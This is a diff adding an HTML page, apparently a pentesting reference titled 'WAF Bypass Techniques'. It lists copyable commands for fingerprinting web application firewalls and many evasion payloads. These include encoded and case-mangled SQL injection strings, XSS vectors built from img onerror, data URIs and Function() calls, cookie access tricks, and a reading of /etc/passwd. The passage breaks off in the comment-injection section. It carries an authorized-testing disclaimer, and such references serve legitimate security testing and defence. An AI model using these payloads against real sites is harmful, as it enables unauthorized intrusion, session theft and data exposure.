@@ -1,0 +1,1788 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>BinaryShield // WAF Bypass Techniques</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Exo+2:wght@300;400;600&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#070b0f;--bg2:#0b1118;--bg3:#0f1820;--bg4:#141f28;
+  --border:#1c3344;--cyan:#00d4ff;--green:#00ff88;--orange:#ff8c00;
+  --red:#ff3c78;--purple:#b060ff;--gold:#ffd700;
+  --text:#c9d8e8;--text2:#7a9ab0;--text3:#4a6a80;
+  --mono:"Share Tech Mono",monospace;
+  --display:"Orbitron",sans-serif;
+  --body:"Exo 2",sans-serif;
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+html{scroll-behavior:smooth;}
+body{background:var(--bg);color:var(--text);font-family:var(--body);font-weight:300;overflow-x:hidden;}
+body::-webkit-scrollbar{width:6px;}
+body::-webkit-scrollbar-track{background:var(--bg);}
+body::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px;}
+body::-webkit-scrollbar-thumb:hover{background:var(--cyan);}
+
+/* DISCLAIMER */
+#disc{background:#0f0a00;border-bottom:1px solid var(--orange);padding:8px 20px;
+  display:flex;justify-content:center;align-items:center;gap:12px;position:sticky;top:0;z-index:200;}
+#disc span{font-family:var(--mono);font-size:11px;color:var(--orange);letter-spacing:1px;}
+#disc-close{background:none;border:none;color:var(--orange);font-size:18px;cursor:pointer;line-height:1;margin-left:auto;}
+
+/* HEADER */
+header{background:var(--bg2);border-bottom:1px solid var(--border);padding:14px 40px;
+  display:flex;align-items:center;gap:16px;position:sticky;top:37px;z-index:100;
+  box-shadow:0 4px 20px rgba(0,0,0,.4);flex-wrap:wrap;}
+.logo{font-family:var(--display);font-size:14px;font-weight:900;color:var(--cyan);letter-spacing:2px;text-decoration:none;white-space:nowrap;}
+.logo span{color:var(--green);}
+.header-center{flex:1;display:flex;justify-content:center;min-width:0;}
+#gsearch{background:var(--bg3);border:1px solid var(--border);color:var(--text);font-family:var(--mono);
+  font-size:12px;padding:8px 16px;border-radius:4px;width:min(400px,100%);outline:none;transition:border-color .2s;}
+#gsearch:focus{border-color:var(--cyan);}
+#gsearch::placeholder{color:var(--text3);}
+.hbtn{font-family:var(--mono);font-size:10px;background:var(--bg3);border:1px solid var(--border);
+  color:var(--text2);padding:6px 14px;border-radius:3px;cursor:pointer;transition:all .2s;text-decoration:none;white-space:nowrap;}
+.hbtn:hover{border-color:var(--cyan);color:var(--cyan);}
+
+/* HERO */
+.hero{padding:60px 40px 50px;text-align:center;position:relative;overflow:hidden;
+  background:radial-gradient(ellipse at top,#0b1a26 0%,var(--bg) 70%);border-bottom:1px solid var(--border);}
+.hero::after{content:"WAF";position:absolute;right:30px;bottom:-10px;font-family:var(--display);
+  font-size:140px;font-weight:900;color:rgba(255,60,120,.03);letter-spacing:-5px;pointer-events:none;}
+.hero-tag{display:inline-block;font-family:var(--mono);font-size:9px;background:rgba(255,60,120,.1);
+  color:var(--red);border:1px solid rgba(255,60,120,.3);padding:3px 12px;border-radius:2px;letter-spacing:2px;margin-bottom:14px;}
+.hero h1{font-family:var(--display);font-size:clamp(22px,5vw,38px);font-weight:900;color:#fff;
+  letter-spacing:2px;text-transform:uppercase;margin-bottom:10px;}
+.hero h1 span{color:var(--red);}
+.hero p{font-size:13px;color:var(--text2);max-width:600px;margin:0 auto 26px;line-height:1.7;}
+.stats{display:flex;justify-content:center;gap:36px;flex-wrap:wrap;}
+.sval{font-family:var(--display);font-size:26px;font-weight:700;color:var(--green);}
+.slbl{font-family:var(--mono);font-size:9px;color:var(--text3);letter-spacing:1px;margin-top:2px;}
+
+/* QUICK NAV */
+.qnav{background:var(--bg2);border-bottom:1px solid var(--border);padding:11px 40px;
+  position:sticky;top:93px;z-index:99;overflow-x:auto;}
+.qnav::-webkit-scrollbar{height:0;}
+.qinner{display:flex;gap:8px;min-width:max-content;}
+.qbtn{font-family:var(--mono);font-size:10px;background:var(--bg3);border:1px solid var(--border);
+  color:var(--text2);padding:5px 12px;border-radius:3px;cursor:pointer;transition:all .2s;text-decoration:none;white-space:nowrap;}
+.qbtn:hover{border-color:var(--cyan);color:var(--cyan);}
+
+/* TOOLBAR */
+.toolbar{padding:10px 40px;background:var(--bg3);border-bottom:1px solid var(--border);
+  display:flex;gap:10px;align-items:center;flex-wrap:wrap;}
+
+/* CONTENT */
+#content{max-width:1050px;margin:0 auto;padding:0 40px 80px;}
+
+/* SECTION CARD */
+.sec-card{background:var(--bg2);border:1px solid var(--border);border-radius:8px;
+  overflow:hidden;margin-top:24px;transition:border-color .25s;}
+.sec-card:hover{border-color:rgba(0,212,255,.2);}
+.sec-header{padding:18px 22px;background:var(--bg3);border-bottom:1px solid var(--border);
+  display:flex;align-items:flex-start;gap:14px;cursor:pointer;user-select:none;}
+.sec-icon{font-size:20px;flex-shrink:0;}
+.sec-title-block{flex:1;min-width:0;}
+.sec-title{font-family:var(--display);font-size:13px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;margin-bottom:4px;}
+.sec-desc{font-size:12px;color:var(--text2);line-height:1.5;}
+.chev{color:var(--text3);font-size:14px;margin-left:auto;transition:transform .2s;flex-shrink:0;padding-top:2px;}
+.collapsed-hdr .chev{transform:rotate(-90deg);}
+.sec-body{padding:20px 22px 24px;}
+.sec-body.collapsed{display:none;}
+
+/* GROUP LABEL */
+.group-label{font-family:var(--display);font-size:9px;letter-spacing:2px;text-transform:uppercase;
+  margin:18px 0 8px;display:flex;align-items:center;gap:8px;}
+.group-label::before{content:"";display:inline-block;width:12px;height:1px;background:currentColor;}
+.group-label:first-child{margin-top:0;}
+
+/* CMD BLOCK */
+.cmd-block{background:#040810;border:1px solid var(--border);border-left:3px solid var(--cyan);
+  border-radius:4px;padding:12px 14px;position:relative;font-family:var(--mono);}
+.cmd-line{font-size:12px;color:#a8d8ea;line-height:1.9;display:block;padding-right:60px;word-break:break-all;}
+.cmd-comment{font-size:10px;color:var(--text3);display:block;line-height:1.6;margin-bottom:4px;}
+.copy-btn{position:absolute;top:8px;right:10px;background:var(--bg4);border:1px solid var(--border);
+  color:var(--text3);font-family:var(--mono);font-size:9px;padding:3px 8px;
+  border-radius:2px;cursor:pointer;transition:all .2s;}
+.copy-btn:hover{border-color:var(--cyan);color:var(--cyan);}
+
+/* NO RESULTS */
+#no-results{display:none;text-align:center;padding:60px 20px;font-family:var(--mono);font-size:13px;color:var(--text3);}
+
+/* SCROLL TOP */
+#scrolltop{position:fixed;bottom:24px;right:24px;background:var(--bg3);border:1px solid var(--red);
+  color:var(--red);font-family:var(--mono);font-size:16px;width:38px;height:38px;
+  border-radius:4px;cursor:pointer;display:flex;align-items:center;justify-content:center;
+  transition:all .2s;z-index:300;opacity:0;pointer-events:none;}
+#scrolltop.show{opacity:1;pointer-events:all;}
+#scrolltop:hover{background:var(--red);color:var(--bg);}
+
+/* FOOTER */
+footer{background:var(--bg2);border-top:1px solid var(--border);padding:24px 40px;
+  display:flex;flex-wrap:wrap;justify-content:space-between;align-items:center;gap:14px;}
+.foot-brand{font-family:var(--display);font-size:12px;color:var(--cyan);letter-spacing:2px;}
+.foot-links{display:flex;gap:18px;flex-wrap:wrap;}
+.foot-links a{font-family:var(--mono);font-size:11px;color:var(--text2);text-decoration:none;transition:color .2s;}
+.foot-links a:hover{color:var(--cyan);}
+.foot-contrib{font-family:var(--mono);font-size:11px;color:var(--text3);}
+.foot-contrib a{color:var(--cyan);text-decoration:none;}
+.foot-contrib a:hover{text-decoration:underline;}
+
+/* MOBILE */
+@media(max-width:768px){
+  header{padding:12px 16px;top:33px;flex-wrap:wrap;}
+  .header-center{order:3;flex-basis:100%;}
+  #gsearch{width:100%;}
+  .hero{padding:36px 16px 32px;}
+  .qnav{padding:10px 16px;}
+  .toolbar{padding:10px 16px;}
+  #content{padding:0 16px 60px;}
+  .sec-header{padding:14px 14px;}
+  .sec-body{padding:14px 14px 18px;}
+  .stats{gap:20px;}
+  footer{padding:18px 16px;flex-direction:column;text-align:center;}
+  .foot-links{justify-content:center;}
+  .hero::after{display:none;}
+  .hbtn{display:none;}
+}
+</style>
+</head>
+<body>
+
+<div id="disc">
+  <span>&#9888;&#65039; FOR AUTHORIZED SECURITY TESTING ONLY &mdash; ALL TECHNIQUES FOR EDUCATIONAL USE</span>
+  <button id="disc-close" onclick="this.parentElement.style.display='none'">&#215;</button>
+</div>
+
+<header>
+  <a class="logo" href="https://binaryshield.in" target="_blank" rel="noopener">Binary<span>Shield</span></a>
+  <div class="header-center">
+    <input type="text" id="gsearch" placeholder="&#128269; Search bypass techniques, payloads, WAFs... ( Press / )" oninput="doSearch(this.value)">
+  </div>
+  <div style="display:flex;gap:8px;align-items:center">
+    <button class="hbtn" onclick="expandAll()">&#9660; Expand All</button>
+    <button class="hbtn" onclick="collapseAll()">&#9650; Collapse All</button>
+    <a class="hbtn" href="https://github.com/binaryshield-in/hacking-tools-scripts" target="_blank" rel="noopener">&#128279; GitHub</a>
+  </div>
+</header>
+
+<div class="hero">
+  <div class="hero-tag">// WAF BYPASS REFERENCE</div>
+  <h1>WAF BYPASS <span>TECHNIQUES</span></h1>
+  <p>Every WAF evasion technique a pentester needs &mdash; encoding tricks, payload obfuscation, protocol-level bypasses, and vendor-specific evasion. Organized by attack category.</p>
+  <div class="stats">
+    <div><div class="sval">14</div><div class="slbl">Categories</div></div>
+    <div><div class="sval">300+</div><div class="slbl">Payloads</div></div>
+    <div><div class="sval">8</div><div class="slbl">WAF Vendors</div></div>
+    <div><div class="sval">COPY</div><div class="slbl">Every Command</div></div>
+  </div>
+</div>
+
+<div class="qnav">
+  <div class="qinner">
+    <a class="qbtn" href="#s1">&#128270; Fingerprint</a>
+    <a class="qbtn" href="#s2">&#128290; Encoding</a>
+    <a class="qbtn" href="#s3">&#128289; Case/Keywords</a>
+    <a class="qbtn" href="#s4">&#128196; Comments</a>
+    <a class="qbtn" href="#s5">&#128202; SQLi</a>
+    <a class="qbtn" href="#s6">&#128249; XSS</a>
+    <a class="qbtn" href="#s7">&#9888; CMDi</a>
+    <a class="qbtn" href="#s8">&#128193; Path Traversal</a>
+    <a class="qbtn" href="#s9">&#127760; SSRF</a>
+    <a class="qbtn" href="#s10">&#128196; XXE</a>
+    <a class="qbtn" href="#s11">&#128225; HTTP Headers</a>
+    <a class="qbtn" href="#s12">&#9729; Cloudflare</a>
+    <a class="qbtn" href="#s13">&#128737; ModSecurity</a>
+    <a class="qbtn" href="#s14">&#128295; Tools</a>
+  </div>
+</div>
+
+<div class="toolbar">
+  <span style="font-family:var(--mono);font-size:10px;color:var(--text3)">// Quick actions:</span>
+  <button class="hbtn" onclick="expandAll()">&#9660; Expand All</button>
+  <button class="hbtn" onclick="collapseAll()">&#9650; Collapse All</button>
+</div>
+
+<div id="content">
+<div id="no-results">&#128270; No results. Press Escape to clear.</div>
+<div class="sec-card" id="s1" data-cat="s1">
+  <div class="sec-header" onclick="toggleSec(this)">
+    <div class="sec-icon">&#128270;</div>
+    <div class="sec-title-block">
+      <div class="sec-title" style="color:#00d4ff">WAF FINGERPRINTING</div>
+      <div class="sec-desc">Identify which WAF is in place before attempting bypasses. Different WAFs have different rule sets.</div>
+    </div>
+    <span class="chev">&#9662;</span>
+  </div>
+  <div class="sec-body collapsed">
+    <div class="group-label" style="color:#00d4ff">Detect WAF Passively</div>
+<div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Check response headers &mdash; Server: cloudflare / x-sucuri-id / X-Powered-By-Plesk</span>
+<span class="cmd-line">curl -I https://target.com</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Check cookies &mdash; WAF-specific cookie names reveal vendor</span>
+<span class="cmd-line">Look for: __cfduid, sucuri_cloudproxy_uuid, XXXXXX_waf</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Check error pages &mdash; Custom block page = WAF present</span>
+<span class="cmd-line">Send ' OR 1=1-- to login form</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Check server header &mdash; Server: cloudflare / AkamaiGHost / BigIP</span>
+<span class="cmd-line">curl -v https://target.com 2&gt;&amp;1 | grep -i server</span>
+</div><div class="group-label" style="color:#00d4ff">Active WAF Detection Tools</div>
+<div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// wafw00f basic &mdash; Detect WAF vendor automatically</span>
+<span class="cmd-line">wafw00f https://target.com</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// wafw00f all checks &mdash; -a = try all WAF fingerprints, not just first match</span>
+<span class="cmd-line">wafw00f -a https://target.com</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// wafw00f verbose &mdash; Show all HTTP exchange details</span>
+<span class="cmd-line">wafw00f -v https://target.com</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// nmap WAF detection &mdash; NSE WAF detection script</span>
+<span class="cmd-line">nmap --script http-waf-detect -p 80,443 target.com</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// nmap WAF fingerprint &mdash; NSE WAF identification</span>
+<span class="cmd-line">nmap --script http-waf-fingerprint -p 80,443 target.com</span>
+</div><div class="group-label" style="color:#00d4ff">Common WAF Identifiers</div>
+<div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Cloudflare &mdash; Most common CDN+WAF</span>
+<span class="cmd-line">Response header: cf-ray / server: cloudflare</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// ModSecurity &mdash; Open-source WAF</span>
+<span class="cmd-line">Response: 406 Not Acceptable / 403 with mod_security header</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// AWS WAF &mdash; Cloud WAF</span>
+<span class="cmd-line">X-AMZ headers / response from amazonaws.com</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Akamai &mdash; Enterprise CDN+WAF</span>
+<span class="cmd-line">X-Check-Cacheable header / akamai error pages</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// F5 BIG-IP ASM &mdash; Hardware WAF</span>
+<span class="cmd-line">BigIP cookie / TS01[random] cookie pattern</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Sucuri &mdash; Website security WAF</span>
+<span class="cmd-line">X-Sucuri-ID header / sucuri block page</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Imperva Incapsula &mdash; Enterprise WAF</span>
+<span class="cmd-line">incap_ses cookie / visid_incap cookie</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Barracuda &mdash; Network WAF</span>
+<span class="cmd-line">BNSF cookie / Barracuda Networks block page</span>
+</div>
+  </div>
+</div>
+<div class="sec-card" id="s2" data-cat="s2">
+  <div class="sec-header" onclick="toggleSec(this)">
+    <div class="sec-icon">&#128290;</div>
+    <div class="sec-title-block">
+      <div class="sec-title" style="color:#00ff88">ENCODING BYPASSES</div>
+      <div class="sec-desc">WAFs inspect decoded input. Encoding payloads in various formats can prevent the WAF from matching its rules while the backend still processes them.</div>
+    </div>
+    <span class="chev">&#9662;</span>
+  </div>
+  <div class="sec-body collapsed">
+    <div class="group-label" style="color:#00ff88">URL Encoding</div>
+<div class="cmd-block" style="margin-bottom:6px;border-left-color:#00ff88">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Single URL encode &mdash; Most WAFs decode once before inspecting</span>
+<span class="cmd-line">' = %27   &lt; = %3C   &gt; = %3E   / = %2F   space = %20</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00ff88">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Double URL encode &mdash; WAF decodes once to %27, backend decodes again to '</span>
+<span class="cmd-line">' = %2527   &lt; = %253C   &gt; = %253E</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00ff88">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Partial encode &mdash; Partial encoding confuses some pattern matchers</span>
+<span class="cmd-line">&lt;script&gt; = %3Cscript&gt;</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00ff88">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Plus sign space &mdash; + treated as space in URL query strings</span>
+<span class="cmd-line">SELECT+1+FROM+users</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00ff88">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Tab as space &mdash; Tab (0x09) often treated as whitespace by DB</span>
+<span class="cmd-line">SELECT%09FROM%09users</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00ff88">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Newline bypass &mdash; Newline chars split keyword detection</span>
+<span class="cmd-line">%0aUNION%0aSELECT</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00ff88">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Carriage return &mdash; CR character as token separator</span>
+<span class="cmd-line">%0dSELECT%0dFROM</span>
+</div><div class="group-label" style="color:#00ff88">Unicode / UTF-8 Encoding</div>
+<div class="cmd-block" style="margin-bottom:6px;border-left-color:#00ff88">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Unicode quote &mdash; HTML entity single quote</span>
+<span class="cmd-line">&amp;#x27; or &amp;#39;</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00ff88">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Unicode lt/gt &mdash; HTML entity &lt; and &gt;</span>
+<span class="cmd-line">&amp;#x3C; &amp;#x3E;</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00ff88">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// UTF-8 overlong &mdash; Old parsers accept non-standard encodings</span>
+<span class="cmd-line">/ = %c0%af  (overlong UTF-8)</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00ff88">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Unicode fullwidth &mdash; Full-width ASCII chars may bypass keyword filters</span>
+<span class="cmd-line">ａｌｅｒｔ (fullwidth Latin)</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00ff88">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Cyrillic lookalikes &mdash; Homograph attack on rule matching</span>
+<span class="cmd-line">&amp;#1072; = Cyrillic a  &amp;#1077; = Cyrillic e</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00ff88">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Unicode escapes in JS &mdash; JavaScript processes Unicode escapes</span>
+<span class="cmd-line">\u0073cript = script  \u0061lert = alert</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00ff88">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// HTML entity mix &mdash; Partial HTML encoding</span>
+<span class="cmd-line">&amp;lt;script&amp;gt; mixed with raw chars</span>
+</div><div class="group-label" style="color:#00ff88">Base64 / Other Encodings</div>
+<div class="cmd-block" style="margin-bottom:6px;border-left-color:#00ff88">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Base64 SQLi &mdash; Some apps decode base64 params</span>
+<span class="cmd-line">'+OR+1=1-- base64: JyBPUiAxPTEtLQ==</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00ff88">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Hex encoding in SQL &mdash; MySQL accepts hex string literals</span>
+<span class="cmd-line">0x73656c656374 = SELECT in hex</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00ff88">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// MySQL hex values &mdash; Hex bypasses string comparison filters</span>
+<span class="cmd-line">SELECT 0x61646d696e = SELECT 'admin'</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00ff88">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// HTML entity in attribute &mdash; Decimal HTML entities</span>
+<span class="cmd-line">&lt;img src=x onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&gt;</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00ff88">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Base64 in data URI &mdash; Base64 encoded HTML in data URI</span>
+<span class="cmd-line">&lt;img src='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='&gt;</span>
+</div>
+  </div>
+</div>
+<div class="sec-card" id="s3" data-cat="s3">
+  <div class="sec-header" onclick="toggleSec(this)">
+    <div class="sec-icon">&#128289;</div>
+    <div class="sec-title-block">
+      <div class="sec-title" style="color:#ff8c00">CASE & KEYWORD MANIPULATION</div>
+      <div class="sec-desc">WAFs often use case-sensitive or naive keyword matching. Altering keyword case, splitting them, or using equivalent functions defeats simple pattern rules.</div>
+    </div>
+    <span class="chev">&#9662;</span>
+  </div>
+  <div class="sec-body collapsed">
+    <div class="group-label" style="color:#ff8c00">Case Variation</div>
+<div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff8c00">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Mixed case SQLi &mdash; Most DBs are case-insensitive for keywords</span>
+<span class="cmd-line">SeLeCt * FrOm UsErS</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff8c00">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Mixed case XSS &mdash; HTML parser is case-insensitive</span>
+<span class="cmd-line">&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff8c00">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Mixed case command &mdash; Shell may interpret mixed case</span>
+<span class="cmd-line">CaT /etc/passwd  WhoAmI</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff8c00">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Random case &mdash; Defeats naive UNION SELECT regex</span>
+<span class="cmd-line">uNiOn SeLeCt NuLl,NuLl--</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff8c00">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Alternate upper/lower &mdash; Some WAFs fail on alternating patterns</span>
+<span class="cmd-line">AlTeRnAtInG CaSe</span>
+</div><div class="group-label" style="color:#ff8c00">Keyword Splitting &amp; Concatenation</div>
+<div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff8c00">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// SQL string concat (MySQL) &mdash; Comment splits keyword across tokens</span>
+<span class="cmd-line">SEL/**/ECT  UN/**/ION</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff8c00">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// SQL string concat (MSSQL) &mdash; String concatenation rebuilds keyword</span>
+<span class="cmd-line">SE'+'LECT  UN'+'ION</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff8c00">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// SQL concat function &mdash; Build keywords from hex chars</span>
+<span class="cmd-line">CONCAT(0x73,0x65,0x6c,0x65,0x63,0x74) = SELECT</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff8c00">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Nested comments &mdash; MySQL versioned comments execute on matching version</span>
+<span class="cmd-line">/*!SELECT*/  /*!50000SELECT*/</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff8c00">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Scientific notation &mdash; Some parsers accept 1e0 as number 1</span>
+<span class="cmd-line">1e0UNION SELECT 1</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff8c00">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Inline comment split &mdash; Comments as whitespace</span>
+<span class="cmd-line">SELECT/*bypass*/username/**/FROM/**/users</span>
+</div><div class="group-label" style="color:#ff8c00">Equivalent Functions &amp; Alternatives</div>
+<div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff8c00">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// SUBSTR alternatives &mdash; All extract substrings in MySQL</span>
+<span class="cmd-line">SUBSTRING() MID() SUBSTR()</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff8c00">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// SLEEP alternatives &mdash; Time-based SQLi without SLEEP keyword</span>
+<span class="cmd-line">SLEEP(5) BENCHMARK(10000000,SHA1(1))</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff8c00">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// IF alternatives &mdash; Conditional without IF keyword</span>
+<span class="cmd-line">IF(1=1,1,0)  IIF(1=1,1,0) (MSSQL)</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff8c00">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// CHAR() for strings &mdash; Build string from char codes</span>
+<span class="cmd-line">CHAR(115,101,108,101,99,116) = 'select'</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff8c00">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// alert() alternatives &mdash; XSS without alert keyword</span>
+<span class="cmd-line">confirm(1) prompt(1) console.log(1)</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff8c00">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// eval alternatives &mdash; JS execution without eval</span>
+<span class="cmd-line">Function('alert(1)')()  setTimeout('alert(1)',0)</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff8c00">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// document.cookie alt &mdash; Property access via bracket notation</span>
+<span class="cmd-line">window['document']['cookie']  this['cookie']</span>
+</div>
+  </div>
+</div>
+<div class="sec-card" id="s4" data-cat="s4">
+  <div class="sec-header" onclick="toggleSec(this)">
+    <div class="sec-icon">&#128196;</div>
+    <div class="sec-title-block">
+      <div class="sec-title" style="color:#b060ff">COMMENT & WHITESPACE INJECTION</div>
+      <div class="sec-desc">SQL and HTML parsers treat certain characters as whitespace or ignore comments entirely. Injecting them inside keywords breaks WAF string matching.</div>
+    </div>
+    <span class="chev">&#9662;</span>
+  </div>
+  <div class="sec-body collapsed">
+    <div class="group-label" style="color:#b060ff">SQL Comment Types</div>
+<div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Inline comment (all DBs) &mdash; /**/ treated as space in SQL</span>
